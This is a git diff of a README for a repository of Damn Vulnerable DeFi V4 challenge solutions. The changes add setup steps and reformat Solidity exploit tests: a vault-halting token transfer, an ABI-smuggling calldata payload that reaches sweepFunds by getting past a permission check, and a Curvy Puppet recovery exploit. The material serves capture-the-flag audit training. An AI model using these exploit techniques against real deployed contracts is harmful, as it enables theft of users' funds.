@@ -1,8 +1,15 @@
 # Smart Contract Vulnerability Practices
 
-This repository  includes challenges from Damn Vulnerable DeFi V4 plus concise solutions and remediation notes to build intuition for real-world audits.
+This repository includes challenges from Damn Vulnerable DeFi V4 plus concise solutions and remediation notes to build intuition for real-world audits.
 
 Some tests may require your fork url, please fill in the .env.example file if you need to test any of the tests.
+
+**HOW TO TEST FILES:** Since I did not push the lib/ onto this repository. You must first clone the repository from https://github.com/theredguild/damn-vulnerable-defi or:
+```
+git clone https://github.com/theredguild/damn-vulnerable-defi.git
+```
+
+Then you can run my tests on the cloned repository. **BUT YOU ARE NOT ADVISED TO COPY AND PASTE MY SOLUTIONS.** It is best for you to try and solve it yourself before! Cheers and wish you luck!
 
 ## Contents
 
@@ -40,7 +47,9 @@ Player must halt the vault (`UnstoppableVault.sol`) to stop it from offering any
 - Minimal exploit:
 
 ```solidity
-token.transfer(address(vault), 1); // or any amount
+function test_unstoppable() public checkSolvedByPlayer {
+    token.transfer(address(vault), 1);
+}
 ```
 
 ### Post Mortem
@@ -1052,36 +1061,36 @@ Calldata crafted as follow:
 
 ```solidity
 function test_abiSmuggling() public checkSolvedByPlayer {
-        bytes4 executeSelector = vault.execute.selector;
-        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
-        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
-        bytes memory emptyData = abi.encodePacked(uint256(0));
+    bytes4 executeSelector = vault.execute.selector;
+    bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+    bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+    bytes memory emptyData = abi.encodePacked(uint256(0));
 
-        bytes memory withdrawSelector= abi.encodePacked(
-            bytes4(0xd9caed12),
-            bytes28(0)
-        );
+    bytes memory withdrawSelector= abi.encodePacked(
+        bytes4(0xd9caed12),
+        bytes28(0)
+    );
 
-        bytes memory actionData = abi.encodeWithSelector(
-            vault.sweepFunds.selector,
-            recovery,
-            token
-        );
+    bytes memory actionData = abi.encodeWithSelector(
+        vault.sweepFunds.selector,
+        recovery,
+        token
+    );
 
-        bytes memory actionDataLength = abi.encodePacked(uint256(actionData.length));
+    bytes memory actionDataLength = abi.encodePacked(uint256(actionData.length));
 
-        bytes memory calldataPayload = abi.encodePacked(
-            executeSelector, //4 bytes function seletor
-            target, //32 bytes target address padded
-            dataOffset, //32 Bytes data offset points to 0x80
-            emptyData, //Empty bytes 
-            withdrawSelector, //withdraw function selector to mislead execute function
-            actionDataLength, //The start of the offset, length of actionData 
-            actionData //The start of actionData (4th line)
-        );
+    bytes memory calldataPayload = abi.encodePacked(
+        executeSelector, //4 bytes function seletor
+        target, //32 bytes target address padded
+        dataOffset, //32 Bytes data offset points to 0x80
+        emptyData, //Empty bytes 
+        withdrawSelector, //withdraw function selector to mislead execute function
+        actionDataLength, //The start of the offset, length of actionData 
+        actionData //The start of actionData (4th line)
+    );
 
-        address(vault).call(calldataPayload);
-    }
+    address(vault).call(calldataPayload);
+}
 ```
 
 ### Post Mortem
@@ -1353,6 +1362,25 @@ contract Recover {
             }
         }
     }
+}
+
+function test_curvyPuppet() public checkSolvedByPlayer {
+    IERC20 _lpToken = IERC20(curvePool.lp_token());
+    address[3] memory _users = [alice, bob, charlie];
+    Recover recover = new Recover(
+        _lpToken,
+        stETH, 
+        weth,
+        dvt, 
+        curvePool, 
+        lending, 
+        permit2, 
+        treasury,
+        _users
+    );
+    recover.recover();
+    _lpToken.transferFrom(address(treasury), address(exploit), TREASURY_LP_BALANCE);
+    weth.transferFrom(address(treasury), address(exploit), TREASURY_WETH_BALANCE);
 }
 ```
 
